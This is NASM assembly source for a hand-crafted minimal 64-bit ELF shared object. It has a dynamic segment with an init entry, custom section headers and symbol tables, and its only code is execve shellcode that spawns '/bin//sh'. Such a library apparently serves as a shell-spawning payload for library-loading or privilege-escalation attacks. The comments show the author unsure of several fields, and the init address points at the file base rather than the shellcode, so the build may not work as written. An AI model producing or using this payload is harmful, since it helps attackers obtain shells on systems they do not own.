BITS 64

    org 0x0000000
ehdr:                                                 ; Elf32_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db      0
            dw      3                               ;   e_type
            dw      0x3E                               ;   e_machine
            dd      1                               ;   e_version
            dq      0x0                          ;   e_entry
            dq      phdr - $$                       ;   e_phoff
            dq      shdyn - $$                              ;   e_shoff
            dd      0                               ;   e_flags
            dw      ehdrsize                        ;   e_ehsize
            dw      phdrsize                        ;   e_phentsize
            dw      2                               ;   e_phnum
            dw      shdrsize                               ;   e_shentsize
            dw      6                               ;   e_shnum
            dw      5                               ;   e_shstrndx

ehdrsize      equ     $ - ehdr

phdr:                                                 ; Elf64_Phdr
            dd      1                               ;   p_type
            dd      7                               ;   p_flags
            dq      0                               ;   p_offset
            dq      $$                              ;   p_vaddr
            dq      $$                              ;   p_paddr
            dq      filesize                        ;   p_filesz
            dq      filesize                        ;   p_memsz
            dq      0x1000                          ;   p_align

phdrsize      equ     $ - phdr
            
            dd      2                               ;   p_type
            dd      6                               ;   p_flags
            dq      dt_init - $$                               ;   p_offset
            dq      dt_init - $$ ;   p_vaddr
            dq      dt_init - $$ ;   p_paddr
            dq      0x10                        ;   p_filesz
            dq      0x10                        ;   p_memsz
            dq      0x8                          ;   p_align

dt_init:
    dq      0xc
    dq      $$

;; iDynamic segment contains 13 entries:
;;  Addr: 0x0000000000000128  Offset: 0x000128  Link to section: [ 2] '.dynstr'
;;   Type              Value
;;   INIT              0x0000000000000124
;;   STRTAB            0x00000000000000e0
;;   SYMTAB            0x00000000000000b0
;;   STRSZ             7 (bytes) prob dont need?
;;   SYMENT            24 (bytes) idk
    
shdyn:
            dd 9    ;; sh_name
            dd 0x6     ;; sh_type
            dq 0x3     ;; sh_flags
            dq dt_init ;; sh_addr
            dq dt_init - $$       ;; sh_offset
            dq 0x10    ;; sh_size
            dd 0x1     ;; sh_link
            dd 0       ;; sh_info
            dq 0x8     ;; sh_addralign
            dq 0x10    ;; sh_entsize
shdrsize     equ     $ - shdyn
dynsym:
            dd 39       ;; sh_name
            dd 0x0b        ;; sh_type
            dq 0x2        ;; sh_flags
            dq dynsym_loc ;; sh_addr
            dq dynsym_loc - $$        ;; sh_offset
            dq 0x18       ;; sh_size ???
            dd 0x4       ;; sh_link ???
            dd 0x0       ;; sh_info ???
            dq 0x8        ;; sh_addralign
            dq 0x18       ;; sh_entsize ???
    
symtab:
            dd 30       ;; sh_name
            dd 0x2        ;; sh_type
            dq 0x0        ;; sh_flags
            dq symtab_loc ;; sh_addr
            dq symtab_loc - $$        ;; sh_offset
            dq 0x48       ;; sh_size ???
            dd 0x3       ;; sh_link ???
            dd 0x0       ;; sh_info ???
            dq 0x8        ;; sh_addralign
            dq 0x18       ;; sh_entsize ???
    
strtab:
            dd 0x0       ;; sh_name
            dd 0x3        ;; sh_type
            dq 0x0        ;; sh_flags
            dq 0          ;; sh_addr
            dq strtab_loc - $$        ;; sh_offset
            dq strtab_len       ;; sh_size ???
            dd 0x0       ;; sh_link ???
            dd 0x0       ;; sh_info ???
            dq 0x1        ;; sh_addralign
            dq 0x0       ;; sh_entsize ???
dynstr:
            dd 48       ;; sh_name
            dd 0x3        ;; sh_type
            dq 0x2        ;; sh_flags
            dq dynstr_loc          ;; sh_addr
            dq dynstr_loc - $$        ;; sh_offset
            dq dynstr_len       ;; sh_size ???
            dd 0x0       ;; sh_link ???
            dd 0x0       ;; sh_info ???
            dq 0x1        ;; sh_addralign
            dq 0x0       ;; sh_entsize ???
    
shstrtab:
            dd 19       ;; sh_name
            dd 0x3        ;; sh_type
            dq 0x0        ;; sh_flags
            dq 0x0 ;; sh_addr
            dq shstrtab_loc - $$        ;; sh_offset
            dq shstrtab_len       ;; sh_size ???
            dd 0x0       ;; sh_link ???
            dd 0x0       ;; sh_info ???
            dq 0x1        ;; sh_addralign
            dq 0x0        ;; sh_entsize

_start:
    xor    rsi,rsi
    push   rsi 
    mov    rdi, 0x68732f2f6e69622f
    push   rdi 
    push   rsp 
    pop    rdi 
    push  0x3b 
    pop    rax 
    cdq 
	syscall 


filesize      equ     $ - $$
symtab_loc: 
    dd 0
    db 0x12
    db 0x0
    dw 1
    dq $$
    dq 0x0
    ;; .dynamic
    dd 0x0
    db 0x3
    db 0x0
    dw 1
    dq $$
    dq 0x0

    ;;  _DYNAMIC
    dd 14
    db 0x1
    db 0x0
    dw 1
    dq $$
    dq 0x0
    
dynstr_loc:  db "_init",0
dynstr_len equ $ - dynstr_loc
strtab_loc: db "_init",0,0x2e,".init",0,0x2e,"_DYNAMIC"
strtab_len equ $ - strtab_loc
shstrtab_loc: db ".strtab",0,0x2e,".dynamic",0,0x2e, ".shstrtab",0,0x2e,".symtab",0,0x2e,".dynsym",0,0x2e,".dynstr",0
shstrtab_len equ $ - shstrtab_loc
dynsym_loc:
    dd 0
    db 0x12
    db 0x0
    dw 0x1
    dq $$
    dq 0x0
    
